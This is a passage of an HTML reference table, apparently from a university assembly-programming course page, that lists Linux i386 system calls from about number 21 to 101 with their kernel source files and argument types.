href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>21</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/mount.2.html" target="_blank" rel="noopener">sys_mount</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/super.c" target="_blank" rel="noopener">fs/super.c</a></td><td>char *</td><td>char *</td><td>char *</td><td>-</td><td>-</td></tr><tr><td>22</td><td>sys_oldumount</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/super.c" target="_blank" rel="noopener">fs/super.c</a></td><td>char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>23</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/setuid.2.html" target="_blank" rel="noopener">sys_setuid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#uid_t" target="_blank" rel="noopener">uid_t</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>24</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/getuid.2.html" target="_blank" rel="noopener">sys_getuid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>25</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/stime.2.html" target="_blank" rel="noopener">sys_stime</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/time.c" target="_blank" rel="noopener">kernel/time.c</a></td><td>int *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>26</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/ptrace.2.html" target="_blank" rel="noopener">sys_ptrace</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/ptrace.c" target="_blank" rel="noopener">arch/i386/kernel/ptrace.c</a></td><td>long</td><td>long</td><td>long</td><td>long</td><td>-</td></tr><tr><td>27</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/alarm.2.html" target="_blank" rel="noopener">sys_alarm</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>28</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/fstat.2.html" target="_blank" rel="noopener">sys_fstat</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/stat.c" target="_blank" rel="noopener">fs/stat.c</a></td><td>unsigned int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#__old_kernel_stat" target="_blank" rel="noopener">struct __old_kernel_stat *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>29</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/pause.2.html" target="_blank" rel="noopener">sys_pause</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/sys_i386.c" target="_blank" rel="noopener">arch/i386/kernel/sys_i386.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>30</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/utime.2.html" target="_blank" rel="noopener">sys_utime</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>char *</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#utimbuf" target="_blank" rel="noopener">struct utimbuf *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>33</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/access.2.html" target="_blank" rel="noopener">sys_access</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>const char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>34</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/nice.2.html" target="_blank" rel="noopener">sys_nice</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>36</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sync.2.html" target="_blank" rel="noopener">sys_sync</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/buffer.c" target="_blank" rel="noopener">fs/buffer.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>37</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/kill.2.html" target="_blank" rel="noopener">sys_kill</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/signal.c" target="_blank" rel="noopener">kernel/signal.c</a></td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>38</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/rename.2.html" target="_blank" rel="noopener">sys_rename</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/namei.c" target="_blank" rel="noopener">fs/namei.c</a></td><td>const char *</td><td>const char *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>39</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/mkdir.2.html" target="_blank" rel="noopener">sys_mkdir</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/namei.c" target="_blank" rel="noopener">fs/namei.c</a></td><td>const char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>40</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/rmdir.2.html" target="_blank" rel="noopener">sys_rmdir</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/namei.c" target="_blank" rel="noopener">fs/namei.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>41</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/dup.2.html" target="_blank" rel="noopener">sys_dup</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/fcntl.c" target="_blank" rel="noopener">fs/fcntl.c</a></td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>42</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/pipe.2.html" target="_blank" rel="noopener">sys_pipe</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/sys_i386.c" target="_blank" rel="noopener">arch/i386/kernel/sys_i386.c</a></td><td>unsigned long *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>43</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/times.2.html" target="_blank" rel="noopener">sys_times</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#tms" target="_blank" rel="noopener">struct tms *</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>45</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/brk.2.html" target="_blank" rel="noopener">sys_brk</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/mm/mmap.c" target="_blank" rel="noopener">mm/mmap.c</a></td><td>unsigned long</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>46</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/setgid.2.html" target="_blank" rel="noopener">sys_setgid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#gid_t" target="_blank" rel="noopener">gid_t</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>47</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/getgid.2.html" target="_blank" rel="noopener">sys_getgid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>48</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/signal.2.html" target="_blank" rel="noopener">sys_signal</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/signal.c" target="_blank" rel="noopener">kernel/signal.c</a></td><td>int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#__sighandler_t" target="_blank" rel="noopener">__sighandler_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>49</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/geteuid.2.html" target="_blank" rel="noopener">sys_geteuid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>50</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/getegid.2.html" target="_blank" rel="noopener">sys_getegid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>51</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/acct.2.html" target="_blank" rel="noopener">sys_acct</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/acct.c" target="_blank" rel="noopener">kernel/acct.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>52</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/umount.2.html" target="_blank" rel="noopener">sys_umount</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/super.c" target="_blank" rel="noopener">fs/super.c</a></td><td>char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>54</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/ioctl.2.html" target="_blank" rel="noopener">sys_ioctl</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/ioctl.c" target="_blank" rel="noopener">fs/ioctl.c</a></td><td>unsigned int</td><td>unsigned int</td><td>unsigned long</td><td>-</td><td>-</td></tr><tr><td>55</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/fcntl.2.html" target="_blank" rel="noopener">sys_fcntl</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/fcntl.c" target="_blank" rel="noopener">fs/fcntl.c</a></td><td>unsigned int</td><td>unsigned int</td><td>unsigned long</td><td>-</td><td>-</td></tr><tr><td>57</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/setpgid.2.html" target="_blank" rel="noopener">sys_setpgid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#pid_t" target="_blank" rel="noopener">pid_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#pid_t" target="_blank" rel="noopener">pid_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>59</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/olduname.2.html" target="_blank" rel="noopener">sys_olduname</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/sys_i386.c" target="_blank" rel="noopener">arch/i386/kernel/sys_i386.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#oldold_utsname" target="_blank" rel="noopener">struct oldold_utsname *</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>60</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/umask.2.html" target="_blank" rel="noopener">sys_umask</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>61</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/chroot.2.html" target="_blank" rel="noopener">sys_chroot</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>62</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/ustat.2.html" target="_blank" rel="noopener">sys_ustat</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/super.c" target="_blank" rel="noopener">fs/super.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#dev_t" target="_blank" rel="noopener">dev_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#ustat" target="_blank" rel="noopener">struct ustat *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>63</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/dup2.2.html" target="_blank" rel="noopener">sys_dup2</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/fcntl.c" target="_blank" rel="noopener">fs/fcntl.c</a></td><td>unsigned int</td><td>unsigned int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>64</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/getppid.2.html" target="_blank" rel="noopener">sys_getppid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sched.c" target="_blank" rel="noopener">kernel/sched.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>65</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/getpgrp.2.html" target="_blank" rel="noopener">sys_getpgrp</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>66</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/setsid.2.html" target="_blank" rel="noopener">sys_setsid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>67</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sigaction.2.html" target="_blank" rel="noopener">sys_sigaction</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/signal.c" target="_blank" rel="noopener">arch/i386/kernel/signal.c</a></td><td>int</td><td>const <a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#old_sigaction" target="_blank" rel="noopener">struct old_sigaction *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#old_sigaction" target="_blank" rel="noopener">struct old_sigaction *</a></td><td>-</td><td>-</td></tr><tr><td>68</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sgetmask.2.html" target="_blank" rel="noopener">sys_sgetmask</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/signal.c" target="_blank" rel="noopener">kernel/signal.c</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>69</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/ssetmask.2.html" target="_blank" rel="noopener">sys_ssetmask</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/signal.c" target="_blank" rel="noopener">kernel/signal.c</a></td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>70</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/setreuid.2.html" target="_blank" rel="noopener">sys_setreuid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#uid_t" target="_blank" rel="noopener">uid_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#uid_t" target="_blank" rel="noopener">uid_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>71</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/setregid.2.html" target="_blank" rel="noopener">sys_setregid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#gid_t" target="_blank" rel="noopener">gid_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#gid_t" target="_blank" rel="noopener">gid_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>72</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sigsuspend.2.html" target="_blank" rel="noopener">sys_sigsuspend</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/signal.c" target="_blank" rel="noopener">arch/i386/kernel/signal.c</a></td><td>int</td><td>int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#old_sigset_t" target="_blank" rel="noopener">old_sigset_t</a></td><td>-</td><td>-</td></tr><tr><td>73</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sigpending.2.html" target="_blank" rel="noopener">sys_sigpending</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/signal.c" target="_blank" rel="noopener">kernel/signal.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#old_sigset_t" target="_blank" rel="noopener">old_sigset_t *</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>74</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sethostname.2.html" target="_blank" rel="noopener">sys_sethostname</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td>char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>75</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/setrlimit.2.html" target="_blank" rel="noopener">sys_setrlimit</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td>unsigned int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#rlimit" target="_blank" rel="noopener">struct rlimit *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>76</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/getrlimit.2.html" target="_blank" rel="noopener">sys_getrlimit</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td>unsigned int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#rlimit" target="_blank" rel="noopener">struct rlimit *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>77</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/getrusage.2.html" target="_blank" rel="noopener">sys_getrusage</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td>int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#rusage" target="_blank" rel="noopener">struct rusage *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>78</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/gettimeofday.2.html" target="_blank" rel="noopener">sys_gettimeofday</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/time.c" target="_blank" rel="noopener">kernel/time.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#timeval" target="_blank" rel="noopener">struct timeval *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#timezone" target="_blank" rel="noopener">struct timezone *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>79</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/settimeofday.2.html" target="_blank" rel="noopener">sys_settimeofday</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/time.c" target="_blank" rel="noopener">kernel/time.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#timeval" target="_blank" rel="noopener">struct timeval *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#timezone" target="_blank" rel="noopener">struct timezone *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>80</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/getgroups.2.html" target="_blank" rel="noopener">sys_getgroups</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td>int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#gid_t" target="_blank" rel="noopener">gid_t *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>81</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/setgroups.2.html" target="_blank" rel="noopener">sys_setgroups</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td>int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#gid_t" target="_blank" rel="noopener">gid_t *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>82</td><td>old_select</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/sys_i386.c" target="_blank" rel="noopener">arch/i386/kernel/sys_i386.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#sel_arg_struct" target="_blank" rel="noopener">struct sel_arg_struct *</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>83</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/symlink.2.html" target="_blank" rel="noopener">sys_symlink</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/namei.c" target="_blank" rel="noopener">fs/namei.c</a></td><td>const char *</td><td>const char *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>84</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/lstat.2.html" target="_blank" rel="noopener">sys_lstat</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/stat.c" target="_blank" rel="noopener">fs/stat.c</a></td><td>char *</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#__old_kernel_stat" target="_blank" rel="noopener">struct __old_kernel_stat *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>85</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/readlink.2.html" target="_blank" rel="noopener">sys_readlink</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/stat.c" target="_blank" rel="noopener">fs/stat.c</a></td><td>const char *</td><td>char *</td><td>int</td><td>-</td><td>-</td></tr><tr><td>86</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/uselib.2.html" target="_blank" rel="noopener">sys_uselib</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/exec.c" target="_blank" rel="noopener">fs/exec.c</a></td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>87</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/swapon.2.html" target="_blank" rel="noopener">sys_swapon</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/mm/swapfile.c" target="_blank" rel="noopener">mm/swapfile.c</a></td><td>const char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>88</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/reboot.2.html" target="_blank" rel="noopener">sys_reboot</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td>int</td><td>int</td><td>int</td><td>void *</td><td>-</td></tr><tr><td>89</td><td>old_readdir</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/readdir.c" target="_blank" rel="noopener">fs/readdir.c</a></td><td>unsigned int</td><td>void *</td><td>unsigned int</td><td>-</td><td>-</td></tr><tr><td>90</td><td>old_mmap</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/sys_i386.c" target="_blank" rel="noopener">arch/i386/kernel/sys_i386.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#mmap_arg_struct" target="_blank" rel="noopener">struct mmap_arg_struct *</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>91</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/munmap.2.html" target="_blank" rel="noopener">sys_munmap</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/mm/mmap.c" target="_blank" rel="noopener">mm/mmap.c</a></td><td>unsigned long</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>92</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/truncate.2.html" target="_blank" rel="noopener">sys_truncate</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>const char *</td><td>unsigned long</td><td>-</td><td>-</td><td>-</td></tr><tr><td>93</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/ftruncate.2.html" target="_blank" rel="noopener">sys_ftruncate</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>unsigned int</td><td>unsigned long</td><td>-</td><td>-</td><td>-</td></tr><tr><td>94</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/fchmod.2.html" target="_blank" rel="noopener">sys_fchmod</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>unsigned int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#mode_t" target="_blank" rel="noopener">mode_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>95</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/fchown.2.html" target="_blank" rel="noopener">sys_fchown</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>unsigned int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#uid_t" target="_blank" rel="noopener">uid_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#gid_t" target="_blank" rel="noopener">gid_t</a></td><td>-</td><td>-</td></tr><tr><td>96</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/getpriority.2.html" target="_blank" rel="noopener">sys_getpriority</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>97</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/setpriority.2.html" target="_blank" rel="noopener">sys_setpriority</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td>int</td><td>int</td><td>int</td><td>-</td><td>-</td></tr><tr><td>99</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/statfs.2.html" target="_blank" rel="noopener">sys_statfs</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>const char *</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#statfs" target="_blank" rel="noopener">struct statfs *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>100</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/fstatfs.2.html" target="_blank" rel="noopener">sys_fstatfs</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>unsigned int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#statfs" target="_blank" rel="noopener">struct statfs *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>101</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/ioperm.2.html" target="_blank" rel="noopener">sys_ioperm</a></td><td><a 